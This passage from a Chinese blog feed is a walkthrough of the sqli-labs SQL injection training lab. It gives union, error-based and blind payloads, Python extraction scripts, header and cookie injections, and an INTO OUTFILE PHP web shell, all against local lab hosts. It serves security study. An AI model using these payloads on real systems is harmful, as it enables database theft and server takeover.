    <id>0verwatch.top/2018/08/29/sqli-labs-training-1/</id>
    <published>2018-08-29T12:01:04.000Z</published>
    <updated>2018-08-29T12:10:13.903Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近啊先自己SQL注入确实不行，我只能拿出sql注入的基础部分来练练收了，这个实验环境是sqlilabs<a id="more"></a></p><p>一些前置知识<br>系统函数<br>介绍几个常用函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. version()——MySQL 版本</span><br><span class="line">2. user()——数据库用户名</span><br><span class="line">3. database()——数据库名</span><br><span class="line">4. @@datadir——数据库路径</span><br><span class="line">5. @@version_compile_os——操作系统版本</span><br></pre></td></tr></table></figure><p>字符串连接函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. concat(str1,str2,...)——没有分隔符地连接字符串</span><br><span class="line">2. concat_ws(separator,str1,str2,...)——含有分隔符地连接字符串</span><br><span class="line">3. group_concat(str1,str2,...)——连接一个组的所有字符串，并以逗号分隔每一条数据</span><br></pre></td></tr></table></figure><p>一般用于尝试的语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Ps:--+可以用#替换，url 提交过程中Url 编码后的#为%23</span><br><span class="line">or 1=1--+</span><br><span class="line">&apos;or 1=1--+</span><br><span class="line">&quot;or 1=1--+</span><br><span class="line">)or 1=1--+</span><br><span class="line">&apos;)or 1=1--+</span><br><span class="line">&quot;) or 1=1--+</span><br><span class="line">&quot;))or 1=1--+</span><br></pre></td></tr></table></figure><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h3><p>输入?id=1’出现报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;1&apos;&apos; LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure><p>凡是出现这种有回显的报错是感觉是最好做的注入</p><p>常规步骤，<code>暴库-&gt;爆表-&gt;爆列</code><br>这里我们是多写了个单引号导致报错，我们可以从报错看得出来这里是单引号括着id参数<br>所以我们闭合单引号<br>构造我们需要的东西<br><code>http://192.168.100.105/sqlilabs/Less-1/?id=1%27%23</code> 回显正常，说明猜测成功</p><p>去后台看一下语句</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br></pre></td></tr></table></figure><p>是这样子的，没有任何过滤</p><p>然后开始用order by去猜列数<br><code>http://192.168.100.105/sqlilabs/Less-1/?id=1%27 order by 3%23</code>  得到表中应该是三列(用二分法去慢慢测)</p><p>然后开始用union select去回显某一列的东西<br><code>http://192.168.100.105/sqlilabs/Less-1/?id=-1%27</code> union select 1,2,3%23<br>这里我们需要把第一句话弄成结果为空才能显示后面一句话的内容，这里我选择id=-1，然后的话就可以回显2和3,后面就可以利用这两列回显你想要的东西了</p><p>下面我们就开始要用mysql里面自带的information_schema表了<br>猜表名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-1/?id=-1%27 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23</span><br></pre></td></tr></table></figure><p>猜列名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-1/?id=-1%27%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=&apos;users&apos;%23</span><br></pre></td></tr></table></figure><p>才猜对应的内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-1/?id=-1%27%20union%20select%201,2,concat_ws(&apos;%23&apos;,username,password)%20from users limit 0,1%23</span><br></pre></td></tr></table></figure><p>这一句话只能猜一行，所以要想看其他行的内容就必须要刷一下limit的内容了</p><h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><p>很无聊，看一下源代码什么防御都没有</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=$id LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-2/?id=1 order by 5</span><br></pre></td></tr></table></figure><p>测试得到3列，然后开始闭合，其实这一题直接注释了就好</p><p>直接上语句<br>Payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-2/?id=-1 union select 1,2,3#</span><br></pre></td></tr></table></figure><p>这时候想测什么都可以了</p><h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><p>输入?id=1’出现报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;1&apos;&apos;) LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure><p>可以猜测这里应该是一个单引号+括号闭合，测试一下对不对</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-3/?id=1&apos;) %23</span><br></pre></td></tr></table></figure><p>成功回显</p><p>再看看源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=('$id') LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br></pre></td></tr></table></figure><p>果然如此</p><p>Payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-3/?id=-1&apos;) union select 1,database(),3%23</span><br></pre></td></tr></table></figure><h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><p>尝试?id=1’单引号没有报错<br>尝试一下”,发现出现报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&quot;1&quot;&quot;) LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure><p>猜测是<code>&quot;+）</code>的组合<br>闭合一下试试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-4/?id=1&quot;)%23</span><br></pre></td></tr></table></figure><p>成功回显<br>再看看源代码果然是这样<br>接下来就是payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-4/?id=-1&quot;) union select 1,database(),3%23</span><br></pre></td></tr></table></figure><h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><p>根据<code>You are in</code>的有无来判断正确<br>输入id=1’出现报错回显<br>猜测是单引号的注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-5/?id=1%27%23</span><br></pre></td></tr></table></figure><p>尝试闭合一下出现回显，这个题目有两种做法，一种是直接尝试盲注，另一种是报错注入<br>首先来一个报错注入的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-5?id=1&apos; and updatexml(1,concat(0x7e,version(),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>然后再来一个盲注脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://192.168.100.102/sqlilabs/Less-5/?id=1%27 and ascii(substr((select database()),&#123;_&#125;,1))=&#123;__&#125; %23"</span></span><br><span class="line"><span class="comment">#注意一下这里使用=去作为判断条件</span></span><br><span class="line"><span class="comment">#url = "http://192.168.100.102/sqlilabs/Less-5/?id=1%27 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),&#123;_&#125;,1))=&#123;__&#125; %23"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">database = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">65</span>,<span class="number">127</span>):</span><br><span class="line">payload = url.format(_ = i,__ = j)</span><br><span class="line"><span class="comment">#print payload</span></span><br><span class="line">ans  = requests.get(payload)</span><br><span class="line"><span class="comment">#print ans.content</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">'You are in...........'</span> <span class="keyword">in</span> ans.content:</span><br><span class="line"><span class="comment"># database = database + chr(j)</span></span><br><span class="line"><span class="comment"># print database</span></span><br><span class="line">table_name += chr(j)</span><br><span class="line"><span class="keyword">print</span> table_name</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2><p>输入?id=1’没有任何反应，双引号闭合就好了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-6/?id=1&quot;%23</span><br></pre></td></tr></table></figure><p>直接报错即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-6/?id=1&quot; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&apos;users&apos; limit 4,1),0x7e),1)%23</span><br></pre></td></tr></table></figure><h2 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h2><p>是测试写文件的功能<br>直接输入单引号出现错误</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax</span><br></pre></td></tr></table></figure><p>这里得提及一下如果要读取以及写文件的话必须得需要权限，这里我借鉴了一部分内容<br>导入导出相关操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load_file(file_name)：读取文件并返回该文件的内容作为一个字符串。</span><br></pre></td></tr></table></figure><p>使用条件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">A.必须有权限读取并且文件可读</span><br><span class="line"></span><br><span class="line">and (select count(*) from mysql.user)&gt;0/* 如果结果返回正常，说明具有读写权限。如果返回错误，则说明管理员给数据库降权。</span><br><span class="line"></span><br><span class="line">B.欲读取文件必须在服务器上。</span><br><span class="line">C.必须指定文件完整的路径</span><br><span class="line">D.欲读取文件必须小于max_allowed_packet。</span><br></pre></td></tr></table></figure><p>实际应用时，文件读取权限是最难满足的，我们有两个难点需要解决：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.绝对物理路径</span><br><span class="line">2.构造有效的畸形语句(报错爆出绝对路径)</span><br></pre></td></tr></table></figure></p><p>实例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3,4,hex(replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92,114,101,112,97,105,114,92,115,97,109))))</span><br><span class="line">利用hex()将文件导出来，特别是smb文件</span><br><span class="line">-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))</span><br><span class="line">explain：c:/boot.ini的十六进制是0x633s2f626f6f742e696e69</span><br><span class="line">-1 union select 1,1,1,load_file(C:\\boot.ini)</span><br><span class="line">explain：路径里的/用\\代替</span><br><span class="line">load data file导入数据库</span><br><span class="line">略。</span><br><span class="line">导入到文件中</span><br><span class="line">SELECT INTO OUTFILE ‘file_name’,具体参阅其他文章。</span><br><span class="line">file_name 不能是一个已经存在的文件。</span><br></pre></td></tr></table></figure><p>从源代码里面可以发现是要闭合)的，所以我们就可以这样去写文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-7/?id=1&apos;)) union select 1,2,&apos;&lt;?php @eval($_POST[cmd]);?&gt;&apos; into outfile &apos;D:\\phpStudy\\PHPTutorial\\WWW\\sqlilabs\\Less-7\\1.php&apos; --+</span><br></pre></td></tr></table></figure><p>连接成功<br><a href="https://imgchr.com/i/PXe8Ig" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/29/PXe8Ig.md.png" alt="PXe8Ig.md.png"></a></p><h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2><p>这一题源代码里面将有关报错信息全都注释了只能用盲注<br><a href="https://imgchr.com/i/PXetRs" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/29/PXetRs.md.png" alt="PXetRs.md.png"></a><br>先测试发现还是直接一个单号然后加一个注释就可以坐后面的事情了<br>上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'''http://192.168.100.102/sqlilabs/Less-8/?id=1' and ascii(substr((select database()),&#123;_&#125;,1))</span></span><br><span class="line"><span class="string">&gt;&#123;__&#125; %23'''</span></span><br><span class="line"></span><br><span class="line">database = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">    max = <span class="number">127</span></span><br><span class="line">    min = <span class="number">65</span></span><br><span class="line">    <span class="keyword">while</span> abs(max-min)&gt;<span class="number">1</span>:</span><br><span class="line">    mid = (max+min)//<span class="number">2</span></span><br><span class="line">    payload = url.format(_=i,__=mid)</span><br><span class="line">    ans = requests.get(payload)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'You are in...........'</span> <span class="keyword">in</span> ans.content:</span><br><span class="line">    min = mid</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">    max = mid</span><br><span class="line">    database = database + chr(max)</span><br><span class="line">    <span class="keyword">print</span> database</span><br></pre></td></tr></table></figure><h2 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h2><p>这是一个时间盲注的题目<br>直接单引号闭合加个注释其实就ok了，这里就直接给个爆数据库的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'''http://127.0.0.1/sqlilabs/Less-8/?id=1'and if(ascii(substr(database(),&#123;_&#125;,1))=&#123;__&#125;,1,sleep(3))--+'''</span></span><br><span class="line"></span><br><span class="line">database = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">97</span>,<span class="number">127</span>):</span><br><span class="line">        payload = url.format(_=i,__=j)</span><br><span class="line">        <span class="keyword">print</span> payload</span><br><span class="line">        start = time.time()</span><br><span class="line">        ans = requests.get(payload)</span><br><span class="line">        <span class="keyword">if</span> time.time()-start &gt;<span class="number">3</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            database += chr(j)</span><br><span class="line">            <span class="keyword">print</span> database</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h2><p>也是一个时间盲注题目，不过这一题是双引号闭合，把上面的脚本改为双引号就好</p><h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2><p>是一个post表格的界面<br>上来就尝试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&apos; or &apos;1&apos;=&apos;1</span><br><span class="line">passwd=123</span><br></pre></td></tr></table></figure><h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h2><p>再尝试Less-11一部分内容，发现不行，没有报错信息<br>尝试双引号<br>出现报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">your MySQL server version for the right syntax to use near &apos;&quot;)</span><br></pre></td></tr></table></figure><p>应该是有一个括号的<br>尝试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&quot;) or 1=1 #</span><br><span class="line">passwd=123</span><br></pre></td></tr></table></figure><p>立即过</p><h2 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h2><p>上一题的单引号版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&apos;) or 1=1#</span><br><span class="line">passwd=123</span><br></pre></td></tr></table></figure><h2 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&quot; or 1=1#</span><br><span class="line">passwd=123</span><br></pre></td></tr></table></figure><h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&apos; or &apos;1&apos;=&apos;1</span><br><span class="line">passwd=123</span><br></pre></td></tr></table></figure><h2 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&quot;) or 1=1#</span><br><span class="line">passwd=123</span><br></pre></td></tr></table></figure><h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h2><p>这一体的注入点在password上，这也提醒了我们，注入点不一定是在第一个输入框内还有可能是第二输入框呢！<br>我们也可以从源代码的角度去分析，因为源代码写了个check函数去检查username而password反而漏了写<br>对应的password我们可以用报错注入去实现，用单引号闭合password</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: admin</span><br><span class="line">password:1&apos; and updatexml(1,concat(0x7e,database(),0x7e),1)#</span><br></pre></td></tr></table></figure><p>爆表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#</span><br></pre></td></tr></table></figure><p>爆列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&apos;user&apos;),0x7e),1)#</span><br></pre></td></tr></table></figure><p>爆详细信息<br>这时候输入这一句话的时候</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and updatexml(1,concat(0x7e,(select username from users),0x7e),1)#</span><br></pre></td></tr></table></figure><p>会出现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You can&apos;t specify target table &apos;users&apos; for update in FROM clause</span><br></pre></td></tr></table></figure><p>这是mysql自身的问题不能同时对一个表又select又update，所以我们得构造另外一个表去子查询</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; and updatexml(1,concat(0x7e,(select username from (select username  from users)b limit 0,1),0x7e),1)#</span><br></pre></td></tr></table></figure><p>介绍一下里面的过滤函数，其他两个很熟悉就不介绍了<br><code>mysql_real_escape_string()</code><br>函数转义SQL 语句中使用的字符串中的特殊字符。<br>下列字符受影响：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">\x00</span><br><span class="line">\n</span><br><span class="line">\r</span><br><span class="line">\</span><br><span class="line">&apos;</span><br><span class="line">&quot;</span><br><span class="line">\x1a</span><br></pre></td></tr></table></figure><p>如果成功，则该函数返回被转义的字符串。如果失败，则返回false。</p><h2 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h2><p>一进去就显示ip，可能是http头注入<br>查看源代码我们是要登录进去后才能注入，利用的是insert的那一部分语句<br>先在user-agent那里输入1’ 会出现报错<br><code>MySQL server version for the right syntax to use near &#39;127.0.0.1&#39;, &#39;admin&#39;)&#39;</code><br>再尝试一下<code>1&#39; and &#39;1&#39;=&#39;1</code><br>出现回显没有报错<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Your User Agent is: 1&apos; and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure></p><p>现在就可以直接使用报错注入了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and updatexml(1,concat(0x7e,database(),0x7e),1) and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><h2 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h2><p>从上一题开始这里的每一道题目都需要登陆一下才行<br>这一次回显的是在referer上面<br>尝试在referer上面测试1’ and ‘1’=’1<br>直接回显<br>说明这一次的注入点是在referer上面<br>然后像刚才一样直接报错就好</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: 1&apos; and updatexml(1,concat(0x7e,(database()),0x7e),1) and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><h2 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h2><p>登陆后发现很明显的cookie字样猜测应该是cookie注入<br>退出后尝试在http头处尝试cookie</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&apos;;</span><br></pre></td></tr></table></figure><p>出现报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;admin&apos;&apos; LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure><p>应该是单引号闭合<br>再尝试<br><code>uname=admin&#39; or &#39;1&#39;=&#39;1</code>成功回显<br>下面就很好办了，直接报错注入就好了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&apos; and updatexml(1,concat(0x7e,database(),0x7e),1) or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><h2 id="less-21"><a href="#less-21" class="headerlink" title="less-21"></a>less-21</h2><p>这一题明显发现uname那一部分经过了base64加密<br>我们加上单引号再尝试加密发送看一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=YWRtaW4n</span><br></pre></td></tr></table></figure><p>出现跟上一题一样的报错，看来是一样的了，就是加上base64加密而已</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; and updatexml(1,concat(0x7e,database(),0x7e),1) or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><p>把上面这一串base64加密就好了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YWRtaW4nIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSxkYXRhYmFzZSgpLDB4N2UpLDEpIG9yICcxJz0nMQ==</span><br></pre></td></tr></table></figure><p>直接回显你想要的东西，成功</p><h2 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h2><p>这一题就是上一题的套路，只是把单引号笔换成了双引号而已</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=YWRtaW4i</span><br></pre></td></tr></table></figure><p>出现报错<br>直接<code>admin&quot; or &quot;1&quot;=&quot;1</code> 闭合一下加密提交就好</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=YWRtaW4iIG9yICIxIj0iMQ==</span><br></pre></td></tr></table></figure><p>回显正常<br>开始报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&quot; and updatexml(1,concat(0x7e,database(),0x7e),1) or &quot;1&quot;=&quot;1</span><br></pre></td></tr></table></figure><p>加密得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YWRtaW4iIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSxkYXRhYmFzZSgpLDB4N2UpLDEpIG9yICIxIj0iMQ==</span><br></pre></td></tr></table></figure><p>回显数据库成功</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>SQLi-LABS Page-1(Basic Challenges)的22题就已经全部完爆了<br>这里面的22道题目都是把一些常见的注入类型给过了一遍，我觉得大概都是四种类型</p><figure class="highlight plain"><table><tr><td 